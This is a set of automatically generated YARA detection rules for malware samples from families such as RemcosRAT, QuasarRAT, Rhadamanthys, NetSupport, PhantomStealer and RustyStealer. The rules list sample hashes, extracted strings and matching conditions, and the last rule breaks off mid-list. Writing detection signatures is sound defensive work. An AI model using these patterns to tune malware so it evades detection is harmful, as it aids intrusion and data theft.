rule _PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7548_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_97 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash2 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash3 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
   strings:
      $s1 = "nSystem.Collections.Generic.IEnumerable<T>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s2 = "HDetermineMinSpinCountForAdaptiveSpin2GetWaiterForCurrentThread" fullword ascii /* score: '12.00'*/
      $s3 = "4GetThreadStaticBaseForType" fullword ascii /* score: '12.00'*/
      $s4 = "*GetUtf8SequenceLength@" fullword ascii /* score: '9.00'*/
      $s5 = "get_Current@" fullword ascii /* score: '9.00'*/
      $s6 = "SetLeftoverData8DrainLeftoverDataForGetChars@" fullword ascii /* score: '9.00'*/
      $s7 = " CombineSelectors=" fullword ascii /* score: '9.00'*/
      $s8 = "&get_HasLeftoverData>TryDrainLeftoverDataForGetBytes@" fullword ascii /* score: '9.00'*/
      $s9 = " CombineSelectorsy" fullword ascii /* score: '9.00'*/
      $s10 = " CombineSelectors1" fullword ascii /* score: '9.00'*/
      $s11 = "<GetCorElementTypeOfElementType" fullword ascii /* score: '9.00'*/
      $s12 = " CombineSelectorsY" fullword ascii /* score: '9.00'*/
      $s13 = " FromBase64String" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc8ee04d9f6a0812cc52d3cecac318d2_imphash__RemcosRAT_signature__dcd2b16697810507d442c9bf8a9e913a_imphas_98 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash2 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash3 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash4 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
   strings:
      $s1 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s2 = "System.Runtime.CompilerService" fullword wide /* score: '20.00'*/
      $s3 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '17.00'*/
      $s4 = "<TryGetPointerTypeForTargetType0GetPointerTypeTargetTypeLTryGetFunctionPointerTypeForComponents@" fullword ascii /* score: '17.00'*/
      $s5 = "ExecutionDomain(ExecutionEnvironment" fullword ascii /* score: '16.00'*/
      $s6 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '16.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<Internal.Metadata.NativeFormat.NamespaceDefinitionHandle>.get_Current@" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<Internal.Reflection.Core.QScopeDefinition>.get_Current@" fullword ascii /* score: '15.00'*/
      $s9 = "XSystem.Collections.IEnumerable.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s10 = "TSystem.Collections.IEnumerator.get_Current@" fullword ascii /* score: '15.00'*/
      $s11 = "get_Target$AddrOfPinnedObject" fullword ascii /* score: '14.00'*/
      $s12 = " GetTypeForwarder@" fullword ascii /* score: '14.00'*/
      $s13 = "IReadOnlySet`1>IInternalStringEqualityComparer(KeyNotFoundException" fullword ascii /* score: '13.00'*/
      $s14 = "@GetFunctionPointerTypeComponents@" fullword ascii /* score: '12.00'*/
      $s15 = "Set8get_IsVectorizationSupported@" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _NetSupport_signature__NetSupport_signature__40de2b1e_99 {
   meta:
      description = "_subset_batch - from files NetSupport(signature).ps1, NetSupport(signature)_40de2b1e.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "97d5769bbbe9d025f9bc5544bf5d916a1087dd078bf4ad371eea0c678bb612d1"
      hash2 = "40de2b1e2d70c836435e2e28d27e880b531cb67ea6e2b8e11802157b0af43e8c"
   strings:
      $s1 = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB" ascii /* base64 encoded string 'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP' */ /* score: '26.50'*/
      $s2 = "OC9QejgvUHo4L1B6OC9QejgvUHo4L1B6OC9QejgvUHo4L1B6OC9QejgvUHo4L1B6OC9QejgvUHo4L1B6OC9QejgvUHo4L1B6OC9QejgvUHo4L1B6OC9QejgvUHo4L1B6" ascii /* base64 encoded string '8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz' */ /* score: '21.00'*/
      $s3 = "nWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0J" ascii /* base64 encoded string 'YGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGB' */ /* score: '21.00'*/
      $s4 = "OS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2Yz" ascii /* base64 encoded string '9/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f3' */ /* score: '21.00'*/
      $s5 = "cDZlbnA2ZW5wNmVucDZlbnA2ZW5wNmVucDZlbnA2ZW5wNmVucDZlbnA2ZW5wNmVucDZlbnA2ZW5wNmVucDZlbnA2ZW5wNmVucDZlbnA2ZW5wNmVucDZlbnA2ZW5wNmVu" ascii /* base64 encoded string 'p6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6en' */ /* score: '21.00'*/
      $s6 = "Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v" ascii /* base64 encoded string '////////////////////////////////////////////////////////////////////////////////////////////////' */ /* score: '18.00'*/
      $s7 = "NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92" ascii /* base64 encoded string '7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v' */ /* score: '17.00'*/
      $s8 = "Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3Ky92NysvdjcrL3Y3" ascii /* base64 encoded string '+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7' */ /* score: '17.00'*/
      $s9 = "dQVGtzdjNnRjJxbkZZR1JDMUJURWkwTGV3MWtwckdsZGYxenBBeDRuYXpZYmp4ZFZkQ3JEdk9LOGlRU2VpM0pzKzdESW5MME1PamFxSEoxZU9jVXl0WEp2NVdtbmI5WV" ascii /* score: '16.00'*/
      $s10 = "I0R0ExVUVDeE1YUjJ4dlltRnNVMmxuYmlCU2IyOTBJRU5CSUMwZ1VqTXhFekFSQmdOVkJBb1RDa2RzYjJKaGJGTnBaMjR4RXpBUkJnTlZCQU1UQ2tkc2IySmhiRk5wWj" ascii /* score: '16.00'*/
      $s11 = "dOVkhTQUVRREErTUR3R0JGVWRJQUF3TkRBeUJnZ3JCZ0VGQlFjQ0FSWW1hSFIwY0hNNkx5OTNkM2N1WjJ4dlltRnNjMmxuYmk1amIyMHZjbVZ3YjNOcGRHOXllUzh3Tm" ascii /* score: '16.00'*/
      $s12 = "FFTEJRQXdUREVnTUI0R0ExVUVDeE1YUjJ4dlltRnNVMmxuYmlCU2IyOTBJRU5CSUMwZ1VqTXhFekFSQmdOVkJBb1RDa2RzYjJKaGJGTnBaMjR4RXpBUkJnTlZCQU1UQ2" ascii /* score: '16.00'*/
      $s13 = "ZRYVN6Z0U5QWZFSXdQVGtzdjNnRjJxbkZZR1JDMUJURWkwTGV3MWtwckdsZGYxenBBeDRuYXpZYmp4ZFZkQ3JEdk9LOGlRU2VpM0pzKzdESW5MME1PamFxSEoxZU9jVX" ascii /* score: '16.00'*/
      $s14 = "R3R0JGVWRJQUF3TkRBeUJnZ3JCZ0VGQlFjQ0FSWW1hSFIwY0hNNkx5OTNkM2N1WjJ4dlltRnNjMmxuYmk1amIyMHZjbVZ3YjNOcGRHOXllUzh3TmdZRFZSMGZCQzh3TF" ascii /* score: '16.00'*/
      $s15 = "JNWEpXNGMzMFFQRmMyMzI2Vlhka0p2QUdpQ21kTGp3ZDd3aTVSWFRPd0lrQ0loemlJcm1BeEM1a0tUbEppVDcvMEcyVCs4VzV0VVBDQ3g3bXJXUjNyRnE0RHBNSnJlOG" ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0xbbef and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__12c3d365_RemcosRAT_signature__5e879e2b_100 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_12c3d365.vbs, RemcosRAT(signature)_5e879e2b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "12c3d365008814d16e18a630f7732a6325d9efd9d3cc61508aa78c34e43f4430"
      hash2 = "5e879e2b6fe23a94b6c4d5ae5e7af5be37ff47d9ed5acc7f12e16797efa942d9"
   strings:
      $x1 = "AAAAAAAAAAAA6" ascii /* base64 encoded string '         ' */ /* reversed goodware string '6AAAAAAAAAAAA' */ /* score: '35.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAADQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '       4                               8                               <                       ' */ /* score: '21.00'*/
      $s5 = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '             ' */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                                ' */ /* score: '16.50'*/
      $s8 = "AEAAAEAAAC" ascii /* base64 encoded string ' @  @  ' */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                              ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */ /* score: '16.50'*/
      $s11 = "ADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' 0                             ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                               ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                                             ' */ /* score: '16.50'*/
      $s14 = "AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @                             ' */ /* score: '16.50'*/
      $s15 = "AAAAAAAAAAAAAB" ascii /* base64 encoded string '          ' */ /* score: '16.50'*/
   condition:
      ( ( uint16(0) == 0x704f or uint16(0) == 0x6176 ) and filesize < 7000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__e791f8773bf0061740713805d84feea8_imphash__Rhadamanthys_signature__01916ef7_Rhadamanthys_signature__1cf_101 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash2 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash3 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash4 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash5 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = "8GetSystemSupportsLeapSeconds>GetGetSystemTimeAsFileTimeFnPtr" fullword ascii /* score: '15.00'*/
      $s2 = "Templates* DesktopDirectory" fullword ascii /* score: '15.00'*/
      $s3 = "SearchTarget" fullword ascii /* score: '14.00'*/
      $s4 = "CommonTemplatesZ" fullword ascii /* score: '11.00'*/
      $s5 = "8AppendFormattedWithTempSpace@" fullword ascii /* score: '11.00'*/
      $s6 = "UserProfileP*CommonProgramFilesX86X" fullword ascii /* score: '10.00'*/
      $s7 = "(SHGetKnownFolderPath" fullword ascii /* score: '9.00'*/
      $s8 = "get_Values@" fullword ascii /* score: '9.00'*/
      $s9 = "CDBurningv CommonAdminTools^" fullword ascii /* score: '9.00'*/
      $s10 = "L<SHGetKnownFolderPath>g____PInvoke|1_0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__0cadbef4_RemcosRAT_signature__40c57fa4_RemcosRAT_signature__ee9f38c9_102 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_0cadbef4.vbs, RemcosRAT(signature)_40c57fa4.vbs, RemcosRAT(signature)_ee9f38c9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0cadbef43d1f7353cc789f3ce1b38a94e781f2fee3d17849e0864d991a5e8271"
      hash2 = "40c57fa42423325baf7c646e4c135942c28495cdfa2b8ccec3455dc341013ef7"
      hash3 = "ee9f38c9868efd78d92285557e33e7fc10af0d062a7c3595e9d60056daca40b2"
   strings:
      $s1 = "WScript.Echo \"Original Random Numbers:\"" fullword ascii /* score: '19.00'*/
      $s2 = "WScript.Echo vbCrLf & \"Sorted Numbers:\"" fullword ascii /* score: '15.00'*/
      $s3 = "WScript.Echo vbCrLf & \"Statistics:\"" fullword ascii /* score: '15.00'*/
      $s4 = "WScript.Echo \"Minimum: \" & minVal" fullword ascii /* score: '13.00'*/
      $s5 = "WScript.Echo \"Maximum: \" & maxVal" fullword ascii /* score: '13.00'*/
      $s6 = "WScript.Echo \"Average: \" & Round(avg, 2)" fullword ascii /* score: '13.00'*/
      $s7 = "str = wshNetwork.ComputerName" fullword ascii /* score: '11.00'*/
      $s8 = "'Spdgddfsus associatively ideopraxist eyebolt nonapostolical;" fullword ascii /* score: '10.00'*/
      $s9 = "Set wshNetwork = WScript.CreateObject(\"WScript\" & \".Network\")" fullword ascii /* score: '10.00'*/
      $s10 = "Const Micradfffgffoffafspace = \"Pakddgffafakefdweed kakados,\"" fullword ascii /* score: '9.00'*/
      $s11 = "'Loansdfsdfdarking scrgouged teugh, jernmaske." fullword ascii /* score: '9.00'*/
      $s12 = "eaddfdfdda" ascii /* score: '8.00'*/
      $s13 = "WScript.Quit   " fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0a0a and filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__1c933dd44902e01b2ff610e71216aeb0_imphash__RustyStealer_signature__93c80fcbce9099826de256857f10effe__103 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_1c933dd44902e01b2ff610e71216aeb0(imphash).exe, RustyStealer(signature)_93c80fcbce9099826de256857f10effe(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ec0249a82e80a8856f4d50b537075f67f88a392ce20bb5fbaa18f0f069d91cd9"
      hash2 = "639eab0b1c0c93352fbe6a18a1b06f6d5fb16e14579d14637cd199868b343d6f"
   strings:
      $s1 = "sec-websocket-versionserverset-cookiestrict-transport-securitytetrailertransfer-encodinguser-agentupgradeupgrade-insecure-reques" ascii /* score: '23.00'*/
      $s2 = "sing any application logicstream no longer neededunable to maintain the header compression contextconnection established in resp" ascii /* score: '18.00'*/
      $s3 = "InactiveStreamIdUnexpectedFrameTypePayloadTooBigRejectedReleaseCapacityTooBigOverflowedStreamIdMalformedHeadersMissingUriSchemeA" ascii /* score: '17.00'*/
      $s4 = "ader parsedinvalid content-length parsedunexpected transfer-encoding parsedmessage head is too largeinvalid HTTP status-code par" ascii /* score: '17.00'*/
      $s5 = "last-modifiedlinklocationmax-forwardsoriginpragmaproxy-authenticateproxy-authorizationpublic-key-pinspublic-key-pins-report-only" ascii /* score: '17.00'*/
      $s6 = "lock count overflow in reentrant mutexlibrary\\std\\src\\sync\\reentrant_lock.rs" fullword ascii /* score: '15.00'*/
      $s7 = "library\\std\\src\\sys\\process\\windows.rs" fullword ascii /* score: '15.00'*/
      $s8 = "assertion failed: payload_len_be[0..5].iter().all(|b| *b == 0)" fullword ascii /* score: '14.00'*/
      $s9 = "sedinternal error inside Hyper and/or its dependencies, please reporterror from user's Body streamuser body write abortederror f" ascii /* score: '13.00'*/
      $s10 = "rom user's Serviceno upgrade availableupgrade expected but low level API in usedispatch task is goneconnection closed before mes" ascii /* score: '13.00'*/
      $s11 = "Attempted to access thread-local data while allocating said data." fullword ascii /* score: '13.00'*/
      $s12 = "to_digit: invalid radix -- radix must be in the range 2 to 36 inclusive" fullword ascii /* score: '12.00'*/
      $s13 = "ort-onlycontent-typecookiedntdateetagexpectexpiresforwardedfromif-matchif-modified-sinceif-none-matchif-rangeif-unmodified-since" ascii /* score: '12.00'*/
      $s14 = "dispatch dropped without returning error" fullword ascii /* score: '11.00'*/
      $s15 = "no host in url" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_104 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2d59db9f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3b31e670.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_907526c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfccc82a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea90d10a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb97b31c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0059138.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f602c038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8c88a4db8d0190a82df1edc21e226e5d481f7965b49387af6082bcf900f1b2b8"
      hash2 = "2d59db9fed703dc46e968e99ab95ff572fb8940c9d00c304ac58c512f37591ef"
      hash3 = "3b31e67097313350e8787223555ada0708a6b3bf86d0c8606c61d350954f62d6"
      hash4 = "907526c3c3900f327899c251e01e0bd5678774fc163f0c053eec4cbe1ea5e8b2"
      hash5 = "dfccc82ae13a9096e00d79fc4bb456c3999a8c7c857a66ef778add82c106bb93"
      hash6 = "ea90d10a0f856d00da2e68829e7c87e04f0d4834a05405cdbda1455c05f7de0f"
      hash7 = "eb97b31cf676ed7549a3f1e82bf546934f0509840c496e7eeccf428de1e93138"
      hash8 = "f00591384ec47004189f26bd3766220e991c70987e0c130331a32c38e3411584"
      hash9 = "f602c038f77842fd61953e3fbfa7ec9b085f829ce7376b77b22cb93fc4927d95"
   strings:
      $s1 = "SELECT * FROM Win32_OperatingSystem WHERE Primary='true'" fullword wide /* score: '16.00'*/
      $s2 = "Processor (CPU)" fullword wide /* score: '15.00'*/
      $s3 = "File download started" fullword wide /* score: '14.00'*/
      $s4 = "Select * From Win32_ComputerSystem" fullword wide /* score: '14.00'*/
      $s5 = "GetDrives I/O error" fullword wide /* score: '12.00'*/
      $s6 = "GetDirectory I/O error" fullword wide /* score: '12.00'*/
      $s7 = "GetDirectory Failed" fullword wide /* score: '12.00'*/
      $s8 = "move /y \"" fullword wide /* score: '12.00'*/
      $s9 = "Getting uptime failed" fullword wide /* score: '12.00'*/
      $s10 = "File upload started" fullword wide /* score: '10.00'*/
      $s11 = "GetDrives No permission" fullword wide /* score: '9.00'*/
      $s12 = "GetDrives No drives" fullword wide /* score: '9.00'*/
      $s13 = "GetDirectory No permission" fullword wide /* score: '9.00'*/
      $s14 = "GetDirectory Path too long" fullword wide /* score: '9.00'*/
      $s15 = "GetDirectory Directory not found" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _NetSupport_signature__NetSupport_signature__eea85492_105 {
   meta:
      description = "_subset_batch - from files NetSupport(signature).ps1, NetSupport(signature)_eea85492.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "97d5769bbbe9d025f9bc5544bf5d916a1087dd078bf4ad371eea0c678bb612d1"
      hash2 = "eea854920b54d2daadd282a95071ee15fe699c64f09fb2c90e4266881140e847"
   strings:
      $s1 = "NREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXd" ascii /* base64 encoded string 'DAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw' */ /* score: '21.00'*/
      $s2 = "QmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lH" ascii /* base64 encoded string 'BgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYG' */ /* score: '21.00'*/
      $s3 = "ZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmd" ascii /* base64 encoded string 'GBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBg' */ /* score: '21.00'*/
      $s4 = "Td1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3dTd1N3U3d" ascii /* base64 encoded string 'wSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSwSw' */ /* score: '18.00'*/
      $s5 = "3d256b005d" ascii /* score: '17.00'*/ /* hex encoded string '=%k]' */
      $s6 = "RRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkF" ascii /* base64 encoded string 'EBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA' */ /* score: '14.00'*/
      $s7 = "ER3OFBEdzhQRHc4UER3OFBEdzhQRHc4UER3OFBEdzhQRHc4UER3OFBEdzhQRHc4UER3OFBEdzhQRHc4UER3OFBEdzhQRHc4UER3OFBEdzhQRHc4UER3OFBEdzhQRHc4U" ascii /* score: '11.00'*/
      $s8 = "VFd0hRTmlnYUR4Z0U2d25RS2hNQjE4MTViWHpQQXc0b0dnOFlCT3NaMTZZMSsvNHBoQW9Ua2RDaUtCb1BHQWpyRWRiNktRUU9Fd0hRWWltYi9nOEVDT3NSMDMrdXJNOE" ascii /* score: '11.00'*/
      $s9 = "NnQlFGQlVWRlJZV0ZoUVVBQURBd2dGQ0FpQUFJQUNnbk9GQlhnQUFIQURjd01GQlFpQUFBQUNBb2dJaUFnQUFBQUdCb1lHaG9hQWdJQjNod2NIZHdjQWdJQUFBSUFBZ0" ascii /* score: '11.00'*/
      $s10 = "2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L2YzOS9mMzkvZjM5L" ascii /* score: '11.00'*/
      $s11 = "d01Bd0FBb1" ascii /* base64 encoded string 'wMAwAAo' */ /* score: '11.00'*/
      $s12 = "BBSUFCdUFHOEFkQUFnQUdVQWJnQnZBSFVBWndCb0FDQUFjd0J3QUdFQVl3QmxBQ0FBWmdCdkFISUFJQUJzQUc4QWR3QnBBRzhBSUFCcEFHNEFhUUIwQUdrQVlRQnNBR2" ascii /* score: '11.00'*/
      $s13 = "nI2K3ZyNit2cjYrdnI2K3ZyNit2cjYrdnI2K3ZyNit2cjYrdnI2K3ZyNit2cjYrdnI2K3ZyNit2cjYrdnI2K3ZyNit2cjYrdnI2K3ZyNit2cjYrdnI2K3ZyNit2cjYrd" ascii /* score: '11.00'*/
